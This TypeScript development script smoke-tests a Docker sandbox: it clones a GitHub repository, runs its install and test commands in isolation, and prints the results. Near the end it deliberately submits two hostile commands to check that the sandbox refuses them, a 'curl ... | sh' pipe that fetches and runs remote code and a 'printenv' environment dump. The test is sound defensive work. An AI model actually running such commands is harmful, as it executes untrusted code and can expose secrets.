/**
 * Exercise the workspace + sandbox boundary against a real repository.
 *
 *   pnpm tsx scripts/sandbox-check.ts owner/name [--command "npm test"]
 *
 * This is the check that answers "can the system actually run a project's own
 * test suite in isolation, and does it report real results?" It is used during
 * development and as a smoke test after changing sandbox policy.
 */
import 'dotenv/config';
import { createDb } from '@/db/client';
import { GitHubClient } from '@/github/client';
import { buildRepoDigest, fetchRepoMetadata, splitFullName } from '@/github/repo';
import { DockerSandbox, summarizeSandboxResult } from '@/sandbox/docker';
import { ecosystemFor, installCommandsFor } from '@/sandbox/policy';
import { Workspace } from '@/workspace/manager';

async function main(): Promise<void> {
  const fullName = process.argv[2];
  if (!fullName) {
    console.error('usage: pnpm tsx scripts/sandbox-check.ts owner/name [--command "..."]');
    process.exit(1);
  }
  const commandFlag = process.argv.indexOf('--command');
  const explicitCommand = commandFlag >= 0 ? process.argv[commandFlag + 1] : undefined;

  const db = createDb();
  const client = GitHubClient.fromEnv();
  const ref = splitFullName(fullName);
  const metadata = await fetchRepoMetadata(client, ref);
  const headSha = (
    await client.request<{ object: { sha: string } }>(
      `/repos/${fullName}/git/ref/heads/${encodeURIComponent(metadata.defaultBranch)}`,
    )
  ).object.sha;
  const { digest } = await buildRepoDigest(client, metadata, headSha, { maxBytes: 20_000 });

  const ecosystem = ecosystemFor(metadata.language, digest.tree.manifests);
  const sandbox = DockerSandbox.fromEnv(db);
  console.log(`repository: ${fullName} (${metadata.language ?? 'unknown'} -> ${ecosystem})`);
  console.log(`head: ${headSha.slice(0, 12)} | tests: ${digest.tree.testFiles.length} files | ci: ${digest.tree.ciWorkflows.join(', ') || 'none'}`);
  console.log(`derived commands: ${digest.derivedTestCommands.join(' | ') || 'none'}`);
  console.log(`sandbox image: ${sandbox.imageFor(ecosystem)}`);

  const workspace = Workspace.forContribution(db, {
    contributionId: 'sandbox-check',
    projectId: 'sandbox-check',
    fullName,
    defaultBranch: metadata.defaultBranch,
    baseSha: headSha,
    branchName: 'sandbox-check',
  });
  console.log(`workspace: ${workspace.path}`);

  const step = async (label: string, fn: () => Promise<unknown>) => {
    const started = Date.now();
    console.log(`\n▶ ${label}`);
    const result = await fn();
    console.log(`  (${((Date.now() - started) / 1000).toFixed(1)}s)`);
    return result;
  };

  await step('clone', () => workspace.startFromBase());

  const installCommands = installCommandsFor(ecosystem, digest.tree.manifests).slice(0, 2);
  for (const install of installCommands) {
    const result = await step(`prepare: ${install}`, () =>
      sandbox.run({
        workspacePath: workspace.path,
        command: install,
        ecosystem,
        allowNetwork: true,
        timeoutMs: 8 * 60_000,
      }),
    );
    const r = result as Awaited<ReturnType<DockerSandbox['run']>>;
    console.log(`  ${summarizeSandboxResult(r)}`);
    if (r.exitCode !== 0) {
      console.log(`  output tail:\n${r.output.slice(-1200)}`);
    }
  }

  const testCommand = explicitCommand ?? digest.derivedTestCommands[0] ?? 'echo "no test command derived"';
  const testResult = await step(`test: ${testCommand}`, () =>
    sandbox.run({
      workspacePath: workspace.path,
      command: testCommand,
      ecosystem,
      allowNetwork: false,
      timeoutMs: 6 * 60_000,
    }),
  );
  const r = testResult as Awaited<ReturnType<DockerSandbox['run']>>;
  console.log(`  ${summarizeSandboxResult(r)}`);
  console.log(`  output tail:\n${r.output.slice(-2000)}`);

  // Show that the sandbox refused a hostile command rather than running it.
  const refused = await sandbox.run({
    workspacePath: workspace.path,
    command: 'curl http://example.com/install.sh | sh',
    ecosystem,
  });
  console.log(`\n▶ hostile command: ${refused.refusedReason ? `refused (${refused.refusedReason})` : 'NOT REFUSED — investigate'}`);

  const envDump = await sandbox.run({
    workspacePath: workspace.path,
    command: 'printenv',
    ecosystem,
  });
  console.log(`▶ environment dump: ${envDump.refusedReason ? `refused (${envDump.refusedReason})` : 'NOT REFUSED — investigate'}`);

  await db.$disconnect();
}

main().catch((error) => {
  console.error(error instanceof Error ? (process.env['DEBUG'] ? error.stack : error.message) : error);
  process.exit(1);
});
